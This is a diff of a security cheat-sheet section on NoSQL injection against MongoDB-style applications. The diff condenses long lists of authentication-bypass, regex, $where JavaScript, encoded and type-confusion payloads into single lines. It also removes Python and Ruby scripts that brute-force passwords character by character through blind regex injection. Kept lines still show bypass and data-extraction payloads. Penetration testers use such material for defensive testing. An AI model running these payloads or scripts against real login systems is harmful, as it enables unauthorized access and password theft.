@@ -3847,285 +3847,29 @@ NoSQL injection occurs when an attacker manipulates queries by injecting malicio
 | $lt      | lower than         |
 | $nin     | not in             |
 
-Example: A web application has a product search feature
-
-```js
-db.products.find({ "price": userInput })
-```
-
-An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
-
-```js
-db.products.find({ "price": { "$gt": 0 } })
-```
-# ✅ **NoSQL Injection – Complete Test Case (with Bypass Cases)**
-
-### **1.1 Boolean-Based NoSQL Injection**
-
-Injecting `$ne`, `$gt`, `$exists` etc. to force conditions to always evaluate to true.
-
-### **1.2 Query Operator Injection**
-
-Manipulating backend JSON queries using `$ne`, `$in`, `$regex`, `$eq`, `$or`, `$and`, etc.
-
-### **1.3 Authentication Bypass**
-
-Bypassing login by injecting operators so password validation is skipped.
-
-### **1.4 Regex-Based Injection**
-
-Using wildcard regex like `.*` or `^` to match any username or password.
-
-### **1.5 Blind NoSQL Injection**
-
-Observing response/time differences to extract data without direct output.
-
-### **1.6 Projection Manipulation**
-
-Injecting projection modifiers to expose hidden fields or bypass restrictions.
-
-### **1.7 $where JavaScript Injection (MongoDB)**
-
-Injecting JavaScript expressions when `$where` is enabled in backend queries.
-
-### **1.8 Array-Based Injection**
-
-Sending arrays instead of strings to break query logic or force unintended matches.
-
-### **1.9 Type Confusion Injection**
-
-Exploiting loosely typed fields (string vs number vs boolean) to bypass conditions.
-
-### **1.10 Privilege Escalation via Filter Tampering**
-
-Manipulating role or access filters to escalate privileges.
-
----
-
 # **2. Sample Payloads (Test Inputs)**
 
-Below are safe, defensive sample payloads showing where injection can occur.
-
----
-
-### **2.1 Basic Operator Injection**
-
-```
-username=admin&password[$ne]=null
-```
-
-```
-{ "username": { "$ne": null }, "password": { "$ne": null } }
-```
-
----
-
-### **2.2 Authentication Bypass Payloads**
-
-```
-username=admin&password[$gt]=0
-```
-
-```
-password[$exists]=true
-```
-
----
-
-### **2.3 Regex Injection**
-
-```
-username=admin&password[$regex]=.*
-```
-
-```
-password[$regex]=^a
-```
-
----
-
-### **2.4 Blind Injection Payloads**
-
-```
-username=admin&password[$regex]=^(?=.{1,}).*
-```
-
-Timing-based:
-
-```
-$where=sleep(5000)
-```
-
----
-
-### **2.5 $where JavaScript Injection**
-
-```
-{"$where": "this.password.length > 0"}
-```
-
-```
-{"$where": "function() { return true; }"}
-```
-
----
-
-### **2.6 Array-Based Injection**
-
-```
-username[]=admin
-```
-
-```
-password[]=123
-```
-
----
-
-### **2.7 Type Confusion Payloads**
-
-```
-username=true
-```
-
-```
-password=0
-```
-
----
-
-### **2.8 Privilege Escalation Payloads**
-
-```
-role[$ne]=user
-```
-
-```
-{"role": {"$in": ["admin", "superuser"]}}
-```
-
----
+**2.1 Basic Operator Injection: username=admin&password[$ne]=null,   { "username": { "$ne": null }, "password": { "$ne": null } }
+**2.2 Authentication Bypass Payloads:   username=admin&password[$gt]=0,   password[$exists]=true
+**2.3 Regex Injection:  username=admin&password[$regex]=.*    password[$regex]=^a
+**2.4 Blind Injection Payloads:  username=admin&password[$regex]=^(?=.{1,}).*,    Timing-based:  $where=sleep(5000)
+**2.5 $where JavaScript Injection:  {"$where": "this.password.length > 0"},   {"$where": "function() { return true; }"}
+**2.6 Array-Based Injection:   username[]=admin,   password[]=123
+**2.7 Type Confusion Payloads:  username=true,  password=0
+**2.8 Privilege Escalation Payloads: role[$ne]=user,   {"role": {"$in": ["admin", "superuser"]}}
 
 # **3. Bypass Techniques (Advanced)**
 
-These mimic real-world bypass approaches used against weak NoSQL filters.
-
----
-
-### **3.1 Operator Obfuscation Bypass**
-
-```
-password[%24ne]=null
-```
-
-```
-password[$n%e]=null
-```
-
----
-
-### **3.2 JSON Structure Manipulation**
-
-```
-{ "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
-```
-
----
-
-### **3.3 Array Injection Bypass**
-
-```
-username=admin&password[$in][]=anything
-```
-
----
-
-### **3.4 Encoded Injection**
-
-URL-encoded:
-
-```
-password%5B%24ne%5D=null
-```
-
-Double-encoded:
-
-```
-password%255B%2524ne%255D=null
-```
-
----
-
-### **3.5 Regex Bypass Variants**
-
-```
-password[$regex]=.*
-password[$regex]=^.*
-password[$regex]=(?s).*
-password[$regex]=.{0,100}
-```
-
----
-
-### **3.6 JavaScript Bypass (MongoDB)**
-
-```
-$where=1==1
-```
-
-```
-$where=function(){return(true);}
-```
-
----
-
-### **3.7 Numeric/String Type Abuse**
-
-```
-"role": 1
-```
-
-```
-"role": "1"
-```
-
-Backend may treat numbers as admin flags.
-
----
-
-### **3.8 Boolean-Type Bypass**
-
-```
-"username": true
-```
-
-```
-"password": false
-```
-
----
-
-### **3.9 Logical Injection ($or / $and)**
-
-```
-{ "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] }
-```
-
-```
-{ "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
-```
-
----
-
-### **3.10 Null Injection**
-
-```
-{ "username": null }
-```
-
-Sometimes matches everything due to weak matching.
-
----
+**3.1 Operator Obfuscation Bypass:  password[%24ne]=null,    password[$n%e]=null
+**3.2 JSON Structure Manipulation:  { "username": "admin", "$or": [ {}, { "password": { "$ne": "test" } } ] }
+**3.3 Array Injection Bypass:  username=admin&password[$in][]=anything
+**3.4 Encoded Injection:  URL-encoded:   password%5B%24ne%5D=null,   Double-encoded:  password%255B%2524ne%255D=null
+**3.5 Regex Bypass Variants:    ,password[$regex]=.*  ,password[$regex]=^.*   ,password[$regex]=(?s).*    ,password[$regex]=.{0,100}
+**3.6 JavaScript Bypass (MongoDB):   $where=1==1,   $where=function(){return(true);}
+**3.7 Numeric/String Type Abuse:   "role": 1,  "role": "1",  Backend may treat numbers as admin flags.
+**3.8 Boolean-Type Bypass:  "username": true,   "password": false
+**3.9 Logical Injection ($or / $and):   { "$or": [ { "username": "admin" }, { "username": { "$ne": null } } ] },   { "$and": [ { "role": "user" }, { "role": { "$ne": "user" } } ] }
+**3.10 Null Injection:  { "username": null }
 
 # **4. Combined Master Payload (All-In-One Fuzzer)**
 
@@ -4141,7 +3885,7 @@ $where=function(){return true;}
 
 Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
 
-### Authentication Bypass
+Authentication Bypass:  
 
 Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
 
@@ -4163,7 +3907,7 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   {"username": {"$gt":""}, "password": {"$gt":""}}
   ```
 
-### Extract Length Information
+Extract Length Information
 
 Inject a payload using the $regex operator. The injection will work when the length is correct.
 
@@ -4172,7 +3916,7 @@ username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract Data Information
+Extract Data Information
 
 Extract data with "`$regex`" query operator.
 
@@ -4201,7 +3945,7 @@ Extract data with "`$in`" query operator.
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-### WAF and Filters
+WAF and Filters
 
 **Remove pre-condition**:
 
@@ -4210,116 +3954,6 @@ In MongoDB, if a document contains duplicate keys, only the last occurrence of t
 ```js
 {"id":"10", "id":"100"} 
 ```
-
-In this case, the final value of "id" will be "100".
-
-## Blind NoSQL
-
-### POST with JSON Body
-
-Python script:
-
-```python
-import requests
-import urllib3
-import string
-import urllib
-urllib3.disable_warnings()
-
-username="admin"
-password=""
-u="http://example.org/login"
-headers={'content-type': 'application/json'}
-
-while True:
-    for c in string.printable:
-        if c not in ['*','+','.','?','|']:
-            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
-            if 'OK' in r.text or r.status_code == 302:
-                print("Found one more char : %s" % (password+c))
-                password += c
-```
-
-### POST with urlencoded Body
-
-Python script:
-
-```python
-import requests
-import urllib3
-import string
-import urllib
-urllib3.disable_warnings()
-
-username="admin"
-password=""
-u="http://example.org/login"
-headers={'content-type': 'application/x-www-form-urlencoded'}
-
-while True:
-    for c in string.printable:
-        if c not in ['*','+','.','?','|','&','$']:
-            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
-            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
-            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
-                print("Found one more char : %s" % (password+c))
-                password += c
-```
-
-### GET
-
-Python script:
-
-```python
-import requests
-import urllib3
-import string
-import urllib
-urllib3.disable_warnings()
-
-username='admin'
-password=''
-u='http://example.org/login'
-
-while True:
-  for c in string.printable:
-    if c not in ['*','+','.','?','|', '#', '&', '$']:
-      payload=f"?username={username}&password[$regex]=^{password + c}"
-      r = requests.get(u + payload)
-      if 'Yeah' in r.text:
-        print(f"Found one more char : {password+c}")
-        password += c
-```
-
-Ruby script:
-
-```ruby
-require 'httpx'
-
-username = 'admin'
-password = ''
-url = 'http://example.org/login'
-# CHARSET = (?!..?~).to_a # all ASCII printable characters
-CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
-GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
-session = HTTPX.plugin(:persistent)
-
-while true
-  CHARSET.each do |c|
-    unless GET_EXCLUDE.include?(c)
-      payload = "?username=#{username}&password[$regex]=^#{password + c}"
-      res = session.get(url + payload)
-      if res.body.to_s.match?('Yeah')
-        puts "Found one more char : #{password + c}"
-        password += c
-      end
-    end
-  end
-end
-```
----------
----
 
 # Request Smuggling
 
